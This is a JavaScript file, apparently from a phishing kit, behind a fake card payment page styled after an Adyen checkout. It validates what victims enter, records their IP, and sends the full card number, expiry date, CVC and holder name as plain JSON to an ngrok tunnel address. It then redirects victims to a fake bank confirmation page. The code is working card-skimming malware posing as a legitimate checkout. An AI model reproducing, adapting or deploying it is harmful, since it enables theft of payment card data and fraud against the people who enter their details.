// Obtener parámetros de la URL
function obtenerPrecioDeURL() {
  const params = new URLSearchParams(window.location.search);
  return params.get('precio') || '0.00';
}

// Al cargar la página, ajustar el precio
window.addEventListener('DOMContentLoaded', () => {
  const precio = obtenerPrecioDeURL();
  const inputCantidad = document.querySelector('input[name="amount"]');
  const boton = document.querySelector('.adyen-checkout__button__text');
  if (inputCantidad) inputCantidad.value = precio;
  if (boton) boton.textContent = `Confirmar ${parseFloat(precio).toFixed(2)} €`;
});

// Validación y envío
window.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById('paymentForm');
  const btn = document.getElementById('submitBtn');
  const toast = document.getElementById('toast');

  const inputs = {
    tarjeta: document.getElementById('cardNumber'),
    fecha: document.getElementById('expiry'),
    cvc: document.getElementById('cvc'),
    titular: document.getElementById('holderName')
  };

  if (!form || !btn || !inputs.tarjeta || !inputs.fecha || !inputs.cvc) {
    console.warn("🔧 Faltan elementos necesarios en el DOM para validación.");
    return;
  }

  function showToast(mensaje) {
    if (!toast) return;
    toast.innerText = mensaje;
    toast.style.display = 'block';
    setTimeout(() => toast.style.display = 'none', 3000);
  }

  function validarTarjeta(numeroTarjeta) {
    const limpio = numeroTarjeta.replace(/[\s-]/g, '');
    if (!/^\d+$/.test(limpio)) return false;
    let suma = 0, alternar = false;
    for (let i = limpio.length - 1; i >= 0; i--) {
      let digito = parseInt(limpio[i], 10);
      if (alternar) {
        digito *= 2;
        if (digito > 9) digito -= 9;
      }
      suma += digito;
      alternar = !alternar;
    }
    return suma % 10 === 0;
  }

  function validarFecha(fecha) {
    const hoy = new Date();
    const [mes, añoCorto] = fecha.split('/').map(Number);
    if (!mes || !añoCorto) return false;
    const año = añoCorto < 100 ? 2000 + añoCorto : añoCorto;
    const fechaIngresada = new Date(año, mes - 1, 1);
    return fechaIngresada >= new Date(hoy.getFullYear(), hoy.getMonth(), 1);
  }

  function validarCVC(cvc) {
    return /^\d{3,4}$/.test(cvc);
  }

  function checkForm() {
    const tarjetaOk = validarTarjeta(inputs.tarjeta.value);
    const fechaOk = validarFecha(inputs.fecha.value);
    const cvcOk = validarCVC(inputs.cvc.value);

    inputs.tarjeta.classList.toggle('error', !tarjetaOk);
    inputs.fecha.classList.toggle('error', !fechaOk);
    inputs.cvc.classList.toggle('error', !cvcOk);

    const todoOk = tarjetaOk && fechaOk && cvcOk;
    btn.disabled = !todoOk;
    btn.classList.toggle('disabled', !todoOk);
    return todoOk;
  }

  inputs.tarjeta.addEventListener('input', checkForm);
  inputs.fecha.addEventListener('input', checkForm);
  inputs.cvc.addEventListener('input', checkForm);

  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    if (!checkForm()) {
      showToast('Revisa los datos del formulario');
      return;
    }

    // Obtener IP
    let ip = 'Desconocida';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      ip = data.ip;
    } catch (err) {
      console.warn("No se pudo obtener la IP.");
    }

    const precio = obtenerPrecioDeURL();

    const datos = {
      cardNumber: inputs.tarjeta.value,
      expiry: inputs.fecha.value,
      cvc: inputs.cvc.value,
      holderName: inputs.titular.value,
      storeDetails: form.storeDetails?.checked || false,
      amount: parseFloat(precio),
      ip: ip
    };

    try {
      const respuesta = await fetch("https://discrete-guppy-evenly.ngrok-free.app/pago", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datos)
      });

      if (respuesta.ok) {
        window.location.href = "confirmacion-bancaria.html";
      } else {
        showToast("Error al procesar el pago.");
      }
    } catch (err) {
      showToast("Error de red.");
    }
  });
});